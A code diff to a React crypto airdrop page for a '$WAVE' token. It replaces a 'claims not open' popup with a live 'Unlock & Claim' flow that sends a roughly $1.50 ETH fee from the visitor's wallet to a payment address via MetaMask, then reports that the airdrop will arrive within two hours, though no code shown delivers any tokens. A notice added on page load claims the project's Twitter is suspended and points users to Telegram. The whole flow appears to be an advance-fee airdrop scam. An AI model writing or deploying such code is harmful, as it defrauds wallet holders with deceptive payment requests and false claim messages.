@@ -66,10 +66,9 @@ export default function AirdropPage({
   }>({ step: "idle", message: "" });
   const [showConnectModal, setShowConnectModal] = useState(false);
   const [copied, setCopied] = useState(false);
-  const [showSocialModal, setShowSocialModal] = useState(false);
   const [showClaimNotOpenModal, setShowClaimNotOpenModal] = useState(false);
   const [txnCount, setTxnCount] = useState<number | null>(null);
-  const [showClaimsNotOpenModal, setShowClaimsNotOpenModal] = useState(false);
+  const [showSiteNoticeModal, setShowSiteNoticeModal] = useState(true);
 
   // Eligible checked wallets state
   const [eligibleWallets, setEligibleWallets] = useState<string[]>([]);
@@ -142,16 +141,8 @@ export default function AirdropPage({
     }
   };
 
+  // Now check eligibility without showing social modal
   const checkAirdrop = async () => {
-    const addressToCheck = walletAddress.trim() || connectedAddress;
-    if (!addressToCheck) return;
-    setHasClaimed(false);
-    setClaimStatus({ step: "idle", message: "" });
-    setShowSocialModal(true);
-  };
-
-  const proceedWithAirdropCheck = async () => {
-    setShowSocialModal(false);
     const addressToCheck = walletAddress.trim() || connectedAddress;
     if (!addressToCheck) return;
     setHasClaimed(false);
@@ -181,20 +172,49 @@ export default function AirdropPage({
     setIsChecking(false);
   };
 
-  const handleUnlockAndClaimPopup = () => {
-    setShowClaimsNotOpenModal(true);
-  };
-
-  const getPaymentAmount = async (): Promise<string> => {
+  const handleUnlockAndClaim = async () => {
+    setIsClaiming(true);
+    setClaimStatus({ step: "payment", message: "Requesting payment via MetaMask..." });
     try {
+      const fromAddress = connectedAddress;
+      if (!fromAddress || !window.ethereum) {
+        setClaimStatus({
+          step: "failed",
+          message: "Wallet not connected or MetaMask unavailable.",
+        });
+        setIsClaiming(false);
+        return;
+      }
+
       const ethPriceUSD = await fetchEthPriceUSD();
       const paymentUSD = 1.5;
       const ethAmount = paymentUSD / ethPriceUSD;
-      const weiAmount = Math.floor(ethAmount * 1e18);
-      return `0x${weiAmount.toString(16)}`;
-    } catch {
-      return "0x2386F26FC10000";
+      const weiAmount = `0x${Math.floor(ethAmount * 1e18).toString(16)}`;
+
+      const txParams = {
+        from: fromAddress,
+        to: PAYMENT_RECIPIENT,
+        value: weiAmount,
+      };
+
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [txParams],
+      });
+
+      setClaimStatus({
+        step: "success",
+        message: "Fee sent, you will receive your airdrop within 2 hours.",
+        paymentHash: txHash,
+      });
+      setHasClaimed(true);
+    } catch (error: any) {
+      setClaimStatus({
+        step: "failed",
+        message: "Transaction failed or rejected.",
+      });
     }
+    setIsClaiming(false);
   };
 
   const copyToClipboard = async () => {
@@ -230,11 +250,7 @@ export default function AirdropPage({
       </div>
       <div className="relative z-10 flex flex-col items-center justify-center text-white px-4 py-8 min-h-screen">
         {/* --- Eligible wallets live list --- */}
-        <div className="w-full max-w-md mb-8">
-          
-          
-        </div>
-
+        <div className="w-full max-w-md mb-8" />
         {/* --- UI for connecting, checking, and claiming --- */}
         <div className="mb-8"></div>
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
@@ -254,7 +270,7 @@ export default function AirdropPage({
             <div className="flex items-center gap-3">
               <div className="px-4 py-2 bg-green-500/20 rounded-lg border border-green-300/30">
                 <span className="text-green-100 text-sm">
-                  Connected: {connectedAddress.slice(0, 6)}...{connectedAddress.slice(-4)}
+                  Connected: {connectedAddress && connectedAddress.slice(0, 6)}...{connectedAddress && connectedAddress.slice(-4)}
                 </span>
               </div>
               <button
@@ -323,11 +339,11 @@ export default function AirdropPage({
                       Claim process: Unlock Airdrop ($1.5 fee payment ) ➧ your $WAVE tokens will be automatically airdropped to your wallet in 2-hour batches.
                     </div>
                     <button
-                      onClick={handleUnlockAndClaimPopup}
-                      disabled={isClaiming}
+                      onClick={handleUnlockAndClaim}
+                      disabled={isClaiming || !isConnected}
                       className="px-6 py-2 bg-green-500 hover:bg-green-400 hover:shadow-lg hover:shadow-green-400/50 disabled:bg-green-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 glow-button"
                     >
-                      Unlock &amp; Claim
+                      {isClaiming ? "Processing..." : "Unlock & Claim"}
                     </button>
                   </div>
                 )}
@@ -373,25 +389,35 @@ export default function AirdropPage({
             </div>
           </div>
         </div>
-        {/* Modals (unchanged) */}
-        {showClaimsNotOpenModal && (
-          <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50">
-            <div className="border rounded-xl p-8 max-w-sm w-full mx-4 shadow-2xl flex flex-col items-center border-blue-500 bg-transparent opacity-100">
-              <h3 className="text-xl text-center mb-3 text-blue-700 font-extrabold">
-                Claims Not Open     
+        {/* New site notice modal at open */}
+        {showSiteNoticeModal && (
+          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50">
+            <div className="bg-white border-2 border-blue-500 rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl flex flex-col items-center relative">
+              <span className="absolute top-3 right-3">
+                <button
+                  onClick={() => setShowSiteNoticeModal(false)}
+                  className="p-1 px-3 bg-blue-500/80 text-white rounded-full text-lg font-bold hover:bg-blue-700 transition shadow shadow-blue-400"
+                  title="Close Notice"
+                >
+                  ✕
+                </button>
+              </span>
+              <h3 className="text-2xl font-extrabold mb-3 text-center text-blue-800">
+                $WAVE CLAIM IS OPEN
               </h3>
-              <p className="text-center text-base mb-4 text-white font-semibold">
-                $WAVE Claiming is not open at this time.<br />Please check back later or follow us on Twitter/X for updates.
-              </p>
-              <button
-                onClick={() => setShowClaimsNotOpenModal(false)}
-                className="px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-500 transition"
-              >
-                Close
-              </button>
+              <div className="bg-blue-500/10 border border-blue-400/20 px-4 py-3 rounded-lg mb-3 text-base text-blue-900 text-center font-semibold shadow">
+                Notice: Our Twitter/X has been <strong>suspended</strong> due to a huge number of WAVE point farmers continuously mentioning and tagging us for earning $WAVE.
+              </div>
+              <div className="text-slate-800 font-normal text-center leading-relaxed mb-2">
+                Please join our <a href="https://t.me/Lineawaves" target="_blank" rel="noopener noreferrer" className="text-blue-700 underline font-bold">Telegram</a> while we get back our Twitter.
+              </div>
+              <div className="mt-2 text-blue-600 text-xs text-center italic">
+                Stay safe! Do not trust Twitter links unless officially posted here.
+              </div>
             </div>
           </div>
         )}
+
         {showClaimNotOpenModal && (
           <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-white border border-blue-500 rounded-xl p-8 max-w-sm w-full mx-4 shadow-2xl flex flex-col items-center">
@@ -405,80 +431,7 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-        {showSocialModal && (
-          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
-            <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl">
-              <h3 className="text-xl font-bold text-center mb-4 text-gold">
-                Social Media Engagement Required
-              </h3>
-              <p className="text-blue-200 text-center mb-6 text-sm">
-                To continue with the airdrop check, please complete these actions on X (Twitter):
-              </p>
-              <div className="bg-blue-500/20 border border-blue-300/30 rounded-lg p-4 mb-6">
-                <p className="text-blue-100 text-sm text-center mb-3">📱 Please complete these actions:</p>
-                <ul className="text-blue-200 text-sm space-y-2">
-                  <li>• Like the post</li>
-                  <li>• Retweet the post</li>
-                  <li>• Follow @Lineawaves</li>
-                  <li>• Then return here to continue</li>
-                </ul>
-              </div>
-              <div className="flex flex-col gap-3 mb-4">
-                <a
-                  href="https://x.com/LineaWaves/status/1959904036809068807"
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
-                >
-                  Open X Post
-                </a>
-                <div className="flex gap-2 justify-center">
-                  <a
-                    href="https://twitter.com/intent/like?tweet_id=1959904036809068807"
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="px-4 py-2 bg-pink-600 hover:bg-pink-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
-                    title="Like on X"
-                  >
-                    ❤️ Like
-                  </a>
-                  <a
-                    href="https://twitter.com/intent/retweet?tweet_id=1959904036809068807"
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="px-4 py-2 bg-green-600 hover:bg-green-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
-                    title="Retweet on X"
-                  >
-                    🔁 RT
-                  </a>
-                  <a
-                    href="https://twitter.com/intent/follow?screen_name=Lineawaves"
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="px-4 py-2 bg-yellow-500 hover:bg-yellow-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
-                    title="Follow @Lineawaves"
-                  >
-                    ➕ Follow
-                  </a>
-                </div>
-              </div>
-              <div className="flex gap-3">
-                <button
-                  onClick={proceedWithAirdropCheck}
-                  className="flex-1 py-3 bg-green-500 hover:bg-green-400 hover:shadow-lg hover:shadow-green-400/50 rounded-lg font-semibold transition-all duration-300"
-                >
-                  I've Completed All Actions
-                </button>
-                <button
-                  onClick={() => setShowSocialModal(false)}
-                  className="flex-1 py-3 bg-slate-600/50 hover:bg-slate-600/70 rounded-lg font-semibold transition-colors duration-200"
-                >
-                  Cancel
-                </button>
-              </div>
-            </div>
-          </div>
-        )}
+
         {showConnectModal && (
           <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-sm w-full mx-4 shadow-2xl">
@@ -506,6 +459,7 @@ export default function AirdropPage({
             </div>
           </div>
         )}
+
         {!isValidContractAddress && (
           <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
             ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
